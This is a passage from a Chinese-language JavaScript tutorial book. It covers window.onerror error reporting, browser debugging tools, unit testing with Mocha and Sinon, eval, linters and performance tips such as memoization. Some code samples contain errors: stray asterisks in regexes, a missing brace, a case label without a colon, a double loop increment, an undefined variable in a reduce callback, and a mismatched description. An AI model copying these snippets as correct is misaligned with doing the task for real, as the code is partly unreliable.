  \ (e) {\n    console.log(\"caught error: \" + e.name + \" -> \" + e.message);\n\
  \  }\n}\n\nprotectedFunction(foo, 1, 2, 3); protectedFunction(foo, 4, 5, 6);\n//\
  \ 1 2 3\n// caught error: Error -> custom error! // 4 5 6\n// caught error: Error\
  \ -> custom error!\n```\n\n我们捕获错误并仍然处理所有预期代码，尽管语法有些不同。无论哪种方式可行，但随着你构建更高级的应用，你将希望考虑抽象错误处理的方法。\n\
  \n## 第 98 章：浏览器中的全局错误处理\n\n### 参数\n- `eventOrMessage`\n- `url`\n- `lineNumber`\n\
  - `colNumber`\n- `error`\n\n### 详情\n某些浏览器将只带一个参数（一个 `Event` 对象）调用处理程序。然而，其他浏览器（尤其是旧版本和旧移动设备）会提供一个\
  \ `String` 消息作为第一个参数。\n\n如果调用处理程序时参数超过 1 个，第二个参数通常是产生问题的 JavaScript 文件的 URL。\n\n\
  如果调用处理程序时参数超过 1 个，第三个参数是 JavaScript 源文件中的行号。\n\n如果调用处理程序时参数超过 1 个，第四个参数是 JavaScript\
  \ 源文件中的列号。\n\n如果调用处理程序时参数超过 1 个，第五个参数有时是一个描述问题的 `Error` 对象。\n\n## 第 98.1 节：处理 window.onerror\
  \ 将所有错误报告回服务器端\n\n以下示例监听 `window.onerror` 事件，并使用图像信标（image beacon）技术通过 URL 的 GET\
  \ 参数发送信息。\n\n```javascript\nvar hasLoggedOnce = false;\n// 某些浏览器（至少 Firefox）在通过\
  \ window.addEventListener('error', fn) 处理事件时\n// 不报告行号和列号。这就是为什么一种更可靠的方法是通过直接赋值设置事件监听器.*\n\
  window.onerror = function (eventOrMessage, url, lineNumber, colNumber, error) {\n\
  \  if (hasLoggedOnce || !eventOrMessage) {\n    // 如果以下情况下报告错误没有意义：\n    // 1\\\
  .另一个错误已经报告 —— 页面处于无效状态并可能产生\n    // 过多的错误。\n    // 2\\.提供信息不合理 (!eventOrMessage\
  \ -- 浏览器由于某种原因没有\n    // 提供信息。）\n    return;\n  }\n  hasLoggedOnce = true;\n  if\
  \ (typeof eventOrMessage !== 'string') {\n    error = eventOrMessage.error;\n  \
  \  url = eventOrMessage.filename || eventOrMessage.fileName;\n    lineNumber = eventOrMessage.lineno\
  \ || eventOrMessage.lineNumber;\n    colNumber = eventOrMessage.colno || eventOrMessage.columnNumber;\n\
  \    eventOrMessage = eventOrMessage.message || eventOrMessage.name || error.message\
  \ ||\n    error.name;\n  }\n  if (error && error.stack) {\n    eventOrMessage =\
  \ [eventOrMessage, '; Stack: ', error.stack, '.'].join('');\n  }\n```\n\n\n\n\n\n\
  ```javascript\nvar jsFile = (/[^*/]+\\.js/i*.exec(url || '') || [])[0] || 'inlineScriptOrDynamicEvalCode',\
  \ stack = [eventOrMessage, ' Occurred in ', jsFile, ':', lineNumber || '?', ':',\
  \ colNumber || '?'].join('');\n\n// 缩短消息，使其更有可能符合浏览器的 URL 长度限制（在某些浏览器中为 2,083 字符）\n\
  stack = stack.replace(/https?\\:\\/\\/[^*/]+/gi*, '');\n\n// 调用服务器端处理程序，该程序可能应该将错误注册到数据库或日志文件中\n\
  new Image().src = '/exampleErrorReporting?stack=' + encodeURIComponent(stack);\n\
  \n// window.DEBUG_ENVIRONMENT 是可配置属性，可以在其他地方为了调试和测试将其设置为 true\nif (window.DEBUG_ENVIRONMENT)\
  \ {\nalert('Client-side script failed: ' + stack);\n}\n```\n\n# 第 99 章：调试\n\n##\
  \ 第 99.1 节：交互式解释器变量\n\n注意，这些变量仅在某些浏览器的开发者工具中有效。\n\n`$_` 可以让你获取最后一次求值的表达式的结果。\n\n\
  `\"foo\"` // `\"foo\"`\n\n`$_` // `\"foo\"`\n\n`$0` 指向检查器中当前选的 DOM 元素。如果 `<div id=\"\
  foo\">` 被高亮：\n\n`$0` // `<div id=\"foo\">`\n\n`$0.getAttribute('id')` // `\"foo\"\
  `\n\n`$1` 指向上一个选中的元素，`$2` 指向之前的，`$3` 和 `$4` 依此类推。 \n\n要获取匹配 CSS 选择器的元素集合，请使用 `$(selector)`。这本质上是\
  \ `document.querySelectorAll` 的快捷方式。\n\n```javascript\nvar images = $$('img'); //\
  \ 返回所有匹配元素的数组或节点列表\n```\n`$_ $()¹$$() $0 $1 $2 $3 $4`\n\n| | Opera | Chrome | Firefox\
  \ | IE | Safari |\n| :--- | :--- | :--- | :--- | :--- | :--- |\n| 15+ 11+ 11+ 11+\
  \ 11+ 15+ 15+ 15+ | 22+ ✔ ✔ ✔ ✔ ✔ ✔ ✔ | | 39+ ✔ ✔ ✔ × × × × | | | |\n| | 11 11 11\
  \ 11 11 11 11 11 | | | 6.1+ 4+ 4+ 4+ 4+ 4+ 4+ 4+ |\n\n¹ 是 `document.getElementById`\
  \ 或 `document.querySelector` 的别名\n\n## 第 99.2 节：断点\n\n断点会在执行到达特定一点时暂停程序。然后你可以逐行执行程序，观察其执行情况并检查变量的内容。\n\
  \n创建断点有三种方法。\n\n1. 从代码中，使用 `debugger;` 语句。\n2. 从浏览器，使用开发者工具。\n3. 从集成开发环境 (IDE)。\n\
  \n### debugger 语句\n\n你可以在 JavaScript 代码的任何位置放置 `debugger;` 语句。一旦 JS 解释器到达该行，它将停止脚本执行，允许你检查变量并单步执行代码。\n\
  \n### 开发者工具\n\n第二个选项是直接从浏览器的开发者工具向代码中添加断点。\n\n#### 打开开发者工具（Chrome 或 Firefox）\n\n\
  1. 按 `F12` 打开开发者工具。\n2. 切换到 `Sources`（源代码）标签页（Chrome）或 `Debugger`（调试器）标签页（Firefox）。\n\
  3. 按 `Ctrl + P` 并输入 JavaScript 文件名。\n4. 按 `Enter` 打开它。\n\n#### Internet Explorer\
  \ 或 Edge\n\n1. 按 `F12` 打开开发者工具。\n2. 切换到 `Debugger` 标签页。\n\n#### Safari\n\n1. 按 `F12`\
  \ 打开开发者工具。\n2. 切换到 `Debugger` 标签页。\n3. 看到 `Sources` 之后，按 `Command + P` 并输入 JavaScript\
  \ 文件名。\n4. 按 `Enter` 打开它。\n\n\n\n\n\n![](img/image00710.gif) 在 Chrome 开发者工具的 Elements（元素）标签页或\
  \ Firefox 的 Inspector（检查器）标签页左上角，有一个*选择页面中的元素进行检查*按钮，之后点击页面上的某个元素，即可高亮该元素并将其赋值给变量\
  \ `$0`。\n\nElements 元素检查器可以有多种用法，例如：\n\n1. 你可以检查 JS 是否按照你预期的方式操作 DOM。\n2. 你可以更轻松地调试\
  \ CSS，查看哪些规则影响了该元素（Chrome 中的 `Styles` 标签页）。\n3. 你可以在不重新加载页面的情况下尝试 CSS 和 HTML。\n\n\
  此外，Chrome 会记住在 Elements 标签页中的最后 5 个选择项。`$0` 是当前选择，而 `$1` 是上一个选择。你可以一直使用到 `$4`。这样你就可以轻松地调试多个节点，而无需不断切换选择它们。\n\
  \n你可以在 Google Developers 上阅读更多内容。\n\n## 第 99.7 节：函数调用时断点\n\n对于命名函数（非匿名函数），你可以在函数执行时进行断点。\n\
  \n```javascript\ndebug(functionName);\n```\n\n下一次 `functionName` 函数运行时，调试器将停在它的第一行。\n\
  \n## 第 99.8 节：逐行执行代码\n\n一旦你在断点处暂停了执行，你可能想要逐行跟踪执行以观察发生了什么。打开浏览器的开发者工具，并寻找执行控制（Execution\
  \ Control）图标。（此示例使用 Google Chrome 中的图标，但在其他浏览器中也类似。）\n\n![](img/image00711.gif)\
  \ **恢复 (Resume):** 恢复执行暂停。快捷键：`F8` (Chrome, Firefox)\n\n![](img/image00712.gif)\
  \ **跳过 (Step Over):** 执行下一行代码。如果该行包含函数调用，将运行整个函数并移动到下一行，而不是跳转到函数定义的地方。快捷键：`F10`\
  \ (Chrome, Firefox, IE/Edge), `F6` (Safari)\n\n![](img/image00713.gif) **单步进入 (Step\
  \ Into):** 执行下一行代码。如果该行包含函数调用，将进入函数内部并在该处暂停。快捷键：`F11` (Chrome, Firefox, IE/Edge),\
  \ `F7` (Safari)\n\n![](img/image00714.gif) **单步跳出 (Step Out):** 执行当前函数的剩余部分，跳转回调用函数的地方，并在该下一个语句暂停。快捷键：`Shift\
  \ + F11` (Chrome, Firefox, IE/Edge), `F8` (Safari)\n\n将这些功能与**调用栈 (Call Stack)**\
  \ 结合使用，它会告诉你当前正处于哪个函数内部，哪个函数调用了该函数等等。\n\n请查看 Google 的“如何逐行执行代码”指南以获取更多细节和建议。\n\n\
  浏览器快捷键文档链接：\nChrome Firefox\nIE\nEdge\nSafari\n\n## 第 100 节：JavaScript 单元测试\n\n\
  ### 第 100.1 节：使用 Mocha, Sinon, Chai 和 Proxyquire 测试 Promises\n\n这里有一个需要测试的简单类，它根据外部\
  \ `ResponseProcessor` 的结果返回一个 `Promise`，该处理器执行需要时间。\n\n为了简单起见，我们假设 `processResponse`\
  \ 方法永远不会失败。\n\n```javascript\nimport {processResponse} from '../utils/response_processor';\n\
  \nconst ping = () => {\n  return new Promise((resolve, _reject) => {\n    const\
  \ response = processResponse(data);\n    resolve(response);\n  });\n}\n\nmodule.exports\
  \ = ping;\n```\n\n为了测试此，我们可以利用以下工具：\n\n1. mocha\n2. chai\n3. sinon\n4. proxyquire\n\
  5. chai-as-promised\n\n我在 `package.json` 文件中使用了以下测试脚本。\n\n```json\n\"test\": \"\
  NODE_ENV=test mocha --compilers js:babel-core/register --require ./test/unit/test_helper.js\
  \ --recursive test/**/*_spec.js\"\n```\n\n这允许我使用 es6 语法。它引用了一个如下所示的 `test_helper`：\n\
  \n```javascript\nimport chai from 'chai';\nimport sinon from 'sinon';\nimport sinonChai\
  \ from 'sinon-chai';\nimport chaiAsPromised from 'chai-as-promised'; import sinonStubPromise\
  \ from 'sinon-stub-promise';\n\nchai.use(sinonChai); chai.use(chaiAsPromised); sinonStubPromise(sinon);\n\
  ```\n\n`Proxyquire` 允许我们用自己的存桩（stub）替换外部的 `ResponseProcessor`。然后可以使用 `sinon` 来监控该存桩的方法。我们使用\
  \ `chai-as-promised` 注入 `chai` 的扩展来检查 `ping()` 方法的 promise 是否已完成（fulfilled），以及它最终返回了所需的响应。\n\
  \n```javascript\nimport {expect} from 'chai'; import sinon from 'sinon'; import\
  \ proxyquire from 'proxyquire';\n\nlet formattingStub = { wrapResponse: () => {}\n\
  \nlet ping = proxyquire('../../../src/api/ping', { '../utils/formatting': formattingStub\
  \ });\n\ndescribe ('ping', () => {\n  let wrapResponseSpy, pingResult; const response\
  \ = 'some response';\n\n  beforeEach (() => {\n    wrapResponseSpy = sinon.stub(formattingStub,\
  \ 'wrapResponse').returns(response); pingResult = ping();\n  })\n  afterEach (()\
  \ => {\n    formattingStub.wrapResponse.restore();\n  })\n  it ('returns a fullfilled\
  \ promise', () => { expect(pingResult).to.be.fulfilled; })\n\n  it ('eventually\
  \ returns the correct response', () => { expect(pingResult).to.eventually.equal(response);\
  \ })\n});\n```\n\n现在，假设你想要测试某些使用了 `ping` 响应的内容。\n\n```javascript\nimport {ping}\
  \ from './ping';\n\nconst pingWrapper = () => {\n  ping.then((response) => {\n \
  \   // 对响应进行一些处理\n  });\n}\n\nmodule.exports = pingWrapper;\n```\n\n为了测试 `pingWrapper`，我们利用了：\n\
  \n1. sinon\n2. proxyquire\n3. sinon-stub-promise\n\n之前一样，`Proxyquire` 允许我们用自己的存桩替换外部依赖，在这种情况下是我们之前测试过的\
  \ `ping` 方法。然后我们可以使用 `sinon` 监控该存桩的方法，并利用 `sinon-stub-promise` 允许我们返回 promise。这个\
  \ promise 可以在测试中根据我们的意愿解析或拒绝，以便测试封装器对该的响应。\n\n```javascript\nimport {expect} from\
  \ 'chai'; import sinon from 'sinon'; import proxyquire from 'proxyquire';\n\nlet\
  \ pingStub = { ping: () => {} };\n\nlet pingWrapper = proxyquire('../src/pingWrapper',\
  \ { './ping': pingStub });\n\ndescribe ('pingWrapper', () => {\n  let pingSpy;\n\
  \  const response = 'some response';\n\n  beforeEach (() => {\n    pingSpy = sinon.stub(pingStub,\
  \ 'ping').resolves(response);\n    pingWrapper();\n  })\n  afterEach (() => {\n\
  \    pingStub.wrapResponse.restore();\n  })\n  it ('wraps the ping', () => {\n \
  \   expect(pingSpy).to.have.been.calledWith(response);\n  });\n});\n```\n\n### 第\
  \ 100.2 节：基础断言\n\n在最基础的层，任何语言的单元测试都是对已知或预期的输出提供断言（assertions）。\n\n```javascript\n\
  function assert( outcome, description ) {\n  var passFail = outcome ? 'pass' : 'fail';\n\
  \  console.log(passFail, ': ', description);\n  return outcome;\n}\n```\n\n上述流行的断言方法向我们展示了在大多数\
  \ 浏览器和如 Node.js 等解释器中断言值的一种快速简单的方法。\n\n良好的单元测试设计用于测试离散的代码单元；通常是一个函数。\n\n```javascript\n\
  function add(num1, num2) {\n  return num1 + num2;\n}\n\nvar result = add(5, 20);\n\
  \nassert( result == 24, 'add(5, 20) should return 25...');\n```\n\n在上面的示例中，函数 `add(x,\
  \ y)` 或 `5 + 20` 的返回值显然是 25，因此我们的 24 断言将失败，`assert` 方法将记录一条 \"fail\" 行。\n\n如果我们简单地修改预期的断言结果，测试将成功，输出看起来如下。\n\
  \n```javascript\nassert( result == 25, 'add(5, 20) should return 25...');\n```\n\
  \n控制台输出：\n> pass: should return 25...\n\n这种简单的断言可以确保在许多不同情况下，你的 \"add\" 函数始终返回预期结果，且不需要额外的框架或库即可。\n\
  \n更严谨的断言集看起来如下（对于每个断言都使用 `var result = add(x,y)`）：\n\n```javascript\nassert ( result\
  \ == 0, 'add(0, 0) should return 0...');\nassert( result == 1, 'add(0, -1) should\
  \ return -1...');\nassert( result == 1, 'add(0, 1) should return 1...');\n```\n\n\
  而控制台输出是：\n> pass: should return 0...\n> pass: should return 1...\n> pass: should\
  \ return 1...\n\n\n\n\n\n我们现在可以放心地地说 `add(x,y)`… 应该返回两个整数的和。我们可以将这些封装成类似下面的形式：\n\
  \n```javascript\nfunction test__addsIntegers() {\n  // 期望通过的断言数量\n  var passed =\
  \ 3;\n  // 需要减少并累加为布尔值的断言数量\n  var assertions = [\n    assert( add(0, 0) == 0, 'add(0,\
  \ 0) should return 0...'), assert( add(0, 1) == 1, 'add(0, -1) should return -1...'),\
  \ assert( add(0, 1) == 1, 'add(0, 1) should return 1...')\n  ].reduce(function(previousValue,\
  \ currentValue){\n    return previousValue + current;\n  });\n\n  if (assertions\
  \ === passed) {\n    console.log(\"add(x,y)... did return the sum of two integers\"\
  );\n    return true;\n  } else {\n    console.log(\"add(x,y)... does not reliably\
  \ return the sum of two integers\");\n    return false;\n  }\n}\n```\n\n### 第 101\
  \ 章：评估 JavaScript\n\n#### 参数详情\n\nstring: 要被评估的 JavaScript 代码。\n\n在 JavaScript 中，`eval`\
  \ 函数将字符串视为 JavaScript 代码进行评估。返回值是被评估字符串的结果，例如 `eval('2 + 2')` 返回 4。\n\n`eval` 在全局作用域中可用。评估执行期间的词法作用域是局部作用域，除非被间接调用（例如\
  \ `var geval = eval; geval(s);`）。\n\n**强烈建议不要使用 eval。** 详情请参见“备注”章节。\n\n#### 第 101.1\
  \ 节：评估一段 JavaScript 语句\n\n```javascript\nvar x = 5;\nvar str = \"if (x == 5) {console.log('z\
  \ is 42'); z = 42;} else z = 0; \";\nconsole.log(\"z is \", eval(str));\n```\n\n\
  **强烈建议不要使用 eval。** 详情请参见“备注”章节。\n\n#### 第 101.2 节：引言\n\n你可以始终从 JavaScript 内部运行 JavaScript，尽管由于其带来的安全漏洞，这种做法极不被建议（详情见备注）。\n\
  \n要在 JavaScript 内部运行 JavaScript，只需使用下面的函数即可：\n\n```javascript\neval(\"var a = 'Hello,\
  \ World!'\")\n```\n\n#### 第 101.3 节：评估与数学\n\n你可以使用类似下面的代码，通过 `eval()` 函数将变量设置为某个值：\n\
  \n```javascript\nvar x = 10;\nvar y = 20;\nvar a = eval(\"x * y\") + \"<br>\";\n\
  var b = eval(\"2 + 2\") + \"<br>\";\nvar c = eval(\"x + 17\") + \"<br>\";\nvar res\
  \ = a + b + c;\n```\n\n存储在变量 `res` 中的结果将是：\n200\n4\n27\n\n**强烈建议不要使用 eval。** 详情请参见“备注”章节。\n\
  \n### 第 102 章：Linters - 确保代码质量\n\n#### 第 102.1 节：JSHint\n\nJSHint 是一个用于检测 JavaScript\
  \ 代码中错误和潜在问题的开源工具。\n\n对你的 JavaScript 进行代码检查（lint）你有两种选择：\n\n1. 转到 JSHint.com 并在行编辑器中粘贴你的代码。\n\
  2. 在你的 IDE 中安装 JSHint。\n   - Atom: `linter-jshint`（必须安装 Linter 插件）\n   - Sublime\
  \ Text: `JSHint Gutter` 和/或 `Sublime Linter`\n   - Vim: `jshint.vim` 或 `jshint2.vim`\n\
  \   - Visual Studio: `VSCode JSHint`\n\n将其添加到 IDE 中的一个用处是，你可以创建一个名为 `.jshintrc`\
  \ 的 JSON 配置文件，它在检查你的程序时会被使用。如果你想在项目之间共享配置，这样做非常方便。\n\n示例 `.jshintrc` 文件：\n\n```json\n\
  {\n  \"-W097\": false, // 允许在文档级别使用 \"use strict\"\n  \"browser\": true, // 定义现代浏览器暴露的全局变量\n\
  \  // http://jshint.com/docs/options/#browser\n  \"curly\": true, // 要求在循环和条件语句块中始终加上大括号\n\
  \  // http://jshint.com/docs/options/#curly\n  \"devel\": true, // 定义通常用于简易调试的全局变量：console,\
  \ alert, 等.\n  // http://jshint.com/docs/options/#devel\n  // 列出全局变量（false 表示只读）\n\
  \  \"globals\": {\n    \"globalVar\": true\n  },\n  \"jquery\": true, // 此选项定义由\
  \ jQuery JavaScript 库暴露的全局变量\n  \"newcap\": false, // 列出任何全局函数或常量变量\n  \"predef\"\
  : [\n    \"GlobalFunction\",\n    \"GlobalFunction2\"\n  ],\n  \"undef\": true,\
  \ // 对未定义的变量警告\n  \"unused\": true // 对未使用的变量警告\n}\n```\n\nJSHint 还允许对特定的代码行/块进行配置：\n\
  \n```javascript\nswitch (operation) {\n  case '+' {\n    result = a + b;\n    break;\n\
  \  }\n  // JSHint W086 Expected a 'break' statement // JSHint 标记，允许 cases 无需 break\
  \ /* 穿透 */\n  case '*': case 'x': {\n    result = a * b;\n    break;\n  }\n}\n//\
  \ 因为变量在另一个文件中定义，所以禁用变量未定义的错误 /* jshint -W117 */\nglobalVariable = 'in-another-file.js';\n\
  /* jshint +W117 */\n```\n\n更多配置选项请参见 http://jshint.com/docs/options/\n\n#### 第 102.2\
  \ 节：ESLint / JSCS\n\nESLint 是一个针对你的风格指南的代码风格检查器和格式化工具，非常类似于 JSHint。ESLint 已于 2016\
  \ 年 4 月与 JSCS 合并。设置 ESLint 比设置 JSHint 花费更多精力，但他们的网站上有关于如何入门的清晰说明。\n\nESLint 的示例配置如下：\n\
  \n```json\n{\n  \"rules\": {\n    \"semi\": [\"error\", \"always\"], // 检测到分号时抛出错误\
  \ \n    \"quotes\": [\"error\", \"double\"] // 检测到双引号时抛出错误\n  }\n}\n```\n\n可以在这里找到一个所有规则都设置为关闭、并带有功能说明的示例配置文件。\n\
  \n#### 第 102.3 节：JSLint\n\nJSLint 是从主干分支出来的。JSLint 对如何编写 JavaScript 有非常强硬的观点，引导你使用它认为的“良好”部分，并避开它认为不好的部分。关于\
  \ JSHint 和 ESLint 之间的差异，可以参考这个 StackOverflow 线程。在某些情况下，将 try/catch 保持在独立的函数中会更快。想了解更多关于配置\
  \ JSLint 的信息可以查看 GitHub。\n\n### 第 103 章：反模式\n\n#### 第 103.1 节：声明中的链式赋值\n\n在 `var`\
  \ 声明中链式赋值会意外创建全局变量。\n\n例如：\n\n```javascript\n(function foo() {\n  var a = b = 0;\n\
  })()\nconsole.log('a: ' + a);\nconsole.log('b: ' + b);\n```\n\n会导致 `Uncaught ReferenceError:\
  \ a is not defined 'b: 0'`\n\n在上面的示例中，`a` 是局部的但 `b` 变成了全局。这是因为 `=` 运算符是从右向左求值的。所以上面的代码评估为：\n\
  \n```javascript\nvar a = (b = 0);\n```\n\n链式赋值的正确方式是：\n\n```javascript\nvar a, b;\n\
  a = b = 0;\n```\n\n这将确保 `a` 和 `b` 都是局部变量。\n\n### 第 104 章：性能技巧\n\nJavaScript 与任何语言一样，要求我们谨慎使用语言特性。过度使用某些特性会降低性能，而某些技术可以提高性能。\n\
  \n#### 第 104.1 节：在性能关键函数中避免 try/catch\n\n某些 JavaScript 引擎（例如当前的 Node.js 版本和旧版本的\
  \ Chrome）不会对包含 `try/catch` 块的函数运行优化器。\n\n如果你需要在性能关键代码中处理异常，某些情况下将 `try/catch` 留在单独函数中更快。例如，这个函数不会被某些实现优化：\n\
  \n```javascript\nfunction myPerformanceCriticalFunction() {\n  try {\n    // 执行复杂的计算\n\
  \  } catch (e) {\n    console.log(e);\n  }\n}\n```\n\n但是，你可以通过重构将缓慢代码移动到独立的（*可以*优化的）函数中并在\
  \ `try` 块内部调用它：\n\n```javascript\n// 这个函数可以被优化\nfunction doCalculations() {\n  //\
  \ 执行复杂的计算\n}\n\n// 仍然不总是优化，但因为它执行的内容不多，所以性能不重要\nfunction myPerformanceCriticalFunction()\
  \ {\n  try {\n    doCalculations ();\n  } catch (e) {\n    console.log(e);\n  }\n\
  }\n```\n\n\n\n\n这里有一个 jsPerf 基准测试显示了差异：https://jsperf.com/try-catch-deoptimization。在大多数浏览器的当前版本中，差异可能不大甚至根本没有，但在较旧版本的\
  \ Chrome、Firefox 或 IE 中，在 try/catch 内部调用辅助函数的版本可能会更快。\n\n请注意，此类优化应该谨慎地进行，并基于对你的代码进行性能分析（profiling）后的实际证据。随着\
  \ JavaScript 引擎的改进，它最终可能会损害性能而非有所帮助，或者完全没有影响（但无缘无故地增加了代码复杂度）。是否有帮助、损害或没有影响取决于许多因素，因此请务必测量对你代码的影响。这对于所有优化都适用，但对于这种依赖于编译器/运行时低级细节的微优化尤其如此。\n\
  \n## 第 104.2 节：限制 DOM 更新\n\n在浏览器环境中运行 JavaScript 时，一个常见的错误是比需要更频繁地更新 DOM。\n\n这里的问题在于，DOM\
  \ 接口的每次更新都会导致浏览器重新渲染屏幕。如果更新更改了页面上元素的布局，则整个页面布局都需要重新计算，即使在最简单的情况下，这也是非常消耗性能的。重绘页面的过程被称为\
  \ `reflow`（重流），它可能导致浏览器运行缓慢甚至无响应。\n\n频繁更新文档的后果可以通过以下向列表添加项的示例来说明。\n\n考虑以下包含一个 `<ul>`\
  \ 元素的文档：\n\n```html\n<!DOCTYPE html>\n<html>\n<body>\n<ul id=\"list\"></ul>\n</body>\n\
  </html>\n```\n\n我们通过循环 5000 次向列表添加了 5000 个项目（你可以尝试在性能强劲的计算机上使用更大的数字来增加效果）。\n\n```javascript\n\
  var list = document.getElementById(\"list\");\nfor(var i = 1; i <= 5000; i++) {\n\
  \  list.innerHTML += `<li>item ${i}</li>`; // 更新了 5000 次\n}\n```\n\n在这种情况下，通过将所有\
  \ 5000 次更改批量处理为一次单次 DOM 更新，可以提高性能。\n\n```javascript\nvar list = document.getElementById(\"\
  list\"); var html = \"\";\nfor(var i = 1; i <= 5000; i++) {\n  html += `<li>item\
  \ ${i}</li>`;\n}\nlist.innerHTML = html; // 更新了一次\n```\n\n`document.createDocumentFragment()`\
  \ 函数可以用作循环创建 HTML 的轻量级容器。此方法比修改容器元素的 `innerHTML` 属性稍快（如下所示）。\n\n```javascript\n\
  var list = document.getElementById(\"list\"); var fragment = document.createDocumentFragment();\
  \ for(var i = 1; i <= 5000; i++) {\n  li = document.createElement(\"li\");\n  li.innerHTML\
  \ = \"item \" + i;\n  fragment.appendChild(li);\n  i++;\n}\nlist.appendChild(fragment);\n\
  ```\n\n## 第 104.3 节：对你的代码进行基准测试 - 测量执行时间\n\n大多数性能提示高度取决于 JS 引擎的当前状态，并且仅在特定时间有效。性能优化的基本法是：在尝试优化之前必须先测量，在假设优化之后再次测量。\n\
  \n要测量代码的执行时间，可以使用不同的时间测量工具，例如：\n\n- `Performance` 接口，代表给定页面的计时相关性能信息（仅在浏览器可用）。\n\
  - Node.js 中的 `process.hrtime` 提供以 `[秒, 纳秒]` 元组形式表示的时间信息。不带参数调用时返回任意时间，但当传入之前返回的值作为参数调用时，它返回两次执行之间的差。\n\
  - 控制台计时器：`console.time(\"labelName\")` 启动计时器，用于跟踪操作所需的时间。你可以为每个计时器提供一个唯一的标签名称，在给定页面上最多可以运行\
  \ 10,000 个计时器。当你使用相同的名称调用 `console.timeEnd(\"labelName\")` 时，浏览器将结束该名称的计时并输出自计时开始以来经过的毫秒数。传递给\
  \ `time()` 和 `timeEnd()` 的字符串必须匹配，否则计时器不会结束。\n- `Date.now()` 函数：`Date.now()` 返回当前的毫秒级时间戳，它是自\
  \ 1970 年 1 月 1 日 00:00:00 UTC 到现在的时间的 `Number` 表示。`now()` 方法是 `Date` 的静态方法，因此你始终应该使用\
  \ `Date.now()`。\n\n### 使用 `performance.now()` 的示例 1\n\n在这个示例中，我们将计算函数执行的经过时间，并将使用\
  \ `Performance.now()` 方法，该方法返回一个 `DOMHighResTimeStamp`，以毫秒为单位，精确到毫秒的千分之一。\n\n```javascript\n\
  let startTime, endTime;\nfunction myFunction() {\n  // 你想要测量的慢代码\n}\n// 获取开始时间\n\
  startTime = performance.now();\n// 调用耗时函数\nmyFunction();\n// 获取结束时间\nendTime = performance.now();\n\
  // 差就是调用 myFunction() 所花费的毫秒\nconsole.debug('Elapsed time:', (endTime - startTime));\n\
  ```\n\n控制台中的结果看起来像这样：\n`Elapsed time: 0.10000000009313226`\n\n`performance.now()`\
  \ 在浏览器中具有最高的精度，精确到毫秒的千分之一。\n\n### 使用 `Date.now()` 的示例 2\n\n在这个示例中，我们将计算函数执行的经过时间，并将使用\
  \ `Performance.now()` 方法，该方法返回 `DOMHighResTimeStamp`，以毫秒为单位，精确到毫秒的千分之一。\n\n```javascript\n\
  let t0 = Date.now(); // 自 1970 年 1 月 1 日 00:00:00 UTC 到现在的毫秒级时间戳\nlet arr = [];\n\
  for(let i = 0; i < 1000000; i++) {\n  arr.push(i);\n}\nconsole.log(Date.now() -\
  \ t0); // 输出 t0 到现在的时间\n```\n\n### 使用 `console.time(\"label\")` 的示例 3\n\n在这个示例中，我们执行与示例\
  \ 2 的任务，但我们将使用 `console.time(\"label\")` 和 `console.timeEnd(\"label\")` 方法。\n\n\
  ```javascript\nconsole.time(\"t\"); // 启动标签为 \"t\" 的新计时器\nlet arr = [];\nfor(let\
  \ i = 0; i < 1000000; i++) {\n  arr.push(i);\n}\nconsole.timeEnd(\"t\"); // 结束 \"\
  t\" 计时并输出结果\n```\n\n### 使用 `process.hrtime()` 的示例 4\n\n在 Node.js 程序中，这是测量花费时间最精确的方法。\n\
  \n```javascript\nlet start = process.hrtime();\n// 此处为耗时操作，可能是异步的\nlet diff = process.hrtime(start);\
  \ // 例如返回 [ 1, 2325 ]\nconsole.log(`Operation took ${diff[0] * 1e9 + diff[1]} nanoseconds`);\
  \ // 输出：Operation took 1000002325 nanoseconds\n```\n\n## 第 104.4 节：为密集计算函数使用内存化\n\
  \n如果你正在构建一个对处理器要求很函数（无论是在客户端还是服务器端），你可能想要考虑内存化，它是*之前函数执行结果及其返回值的缓存*。这允许你检查函数的参数之前是否被传递过。记住，纯函数是指给定一个输入返回一个唯一的输出且不在作用范围之外产生副作用的函数，因此，你不应该对不可预测或依赖外部资源（如\
  \ AJAX 调用或随机返回的值）的函数添加内存化。\n\n假设有一个递归阶乘函数：\n\n```javascript\nfunction fact(num)\
  \ {\n  return (num === 0)?1 : num * fact(num - 1);\n}\n```\n\n如果我传递从 1 到 100 的小值（例如），将没有问题，但一旦我们开始深入更深，可能会撑破调用栈，或者让运行该函数的\
  \ JavaScript 引擎过程变得有些痛苦，特别是当引擎没有包含尾调用优化时（尽管 Douglas Crockford 说原生 ES6 包含了尾调用优化）。\n\
  \n\n\n我们可以硬编码一个从 1 到数不可知数字的字典，并包含它们对应的阶乘，但不确定是否建议这样做！让我们创建一个记忆化器（memoizer），好吗？\n\
  \n```javascript\nvar fact = (function() {\n  var cache = {}; // 初始化内存缓存对象\n\n  //\
  \ 使用并返回此函数来检查 val 是否已缓存\n  function checkCache(val) {\n    if (val in cache) {\n\
  \      console.log('It was in the cache :D');\n      return cache[val]; // 返回缓存值\n\
  \    } else {\n      cache[val] = factorial(val); // 我们对其进行缓存\n      return cache[val];\
  \ // 然后返回它\n    }\n  }\n  /* 其他检查方案为：|| cache.hasOwnProperty(val) 或 !!cache[val]\
  \ ||，但如果这些 || 执行的结果为假值，则这种方法将不起作用。 */\n\n  // 我们创建并命名实际要使用的函数\n  function factorial(num)\
  \ {\n    return (num === 0) ? 1 : num * factorial(num - 1);\n  } // factorial 函数结束\n\
  \  /* 我们返回的是检查缓存的函数，而不是计算的 ||，因为它恰好是递归的，|| 如果不是的话，你可以避免在这个自执行闭包函数中创建一个额外的 || 函数。\
  \ */\n\n  return checkCache;\n}());\n```\n\n现在我们可以开始使用它了：\n\n![](img/image00715.jpeg)\
  \ 现在当我开始反思我所做的，如果我是从 1 开始递增而不是从 `num` 递减，我就可以递归地在缓存中缓存 1 到 `num` 的所有阶乘，但我把这留给你们。\n\
  \n这很棒，但如果我们有`multiple parameters`（多个参数）呢？这是一个问题吗？不完全是，我们可以使用一些巧妙的技巧，比如对参数数组使用 `JSON.stringify()`，甚至对函数将依赖的值列表（对于面向对象的方法）。这样做是为了生成一个包含所有参数和依赖的唯一键。\n\
  \n我们还可以创建一个函数来“记忆化”其他函数，使用与之前相同的作用域概念（返回一个使用原始函数并可以访问缓存对象的函数）：\n\n警告：使用了 ES6 语法，如果你不喜欢，请将\
  \ `...` 替换为空并使用 `var args = Array.prototype.slice.call(null, arguments)` 技巧；将 `const`\
  \ 和 `let` 替换为 `var` 以及其他你已知的处理。\n\n```javascript\nfunction memoize(func) {\n  let\
  \ cache = {};\n  // 你可以选择不给函数命名\n  function memoized(...args) {\n    const argsKey\
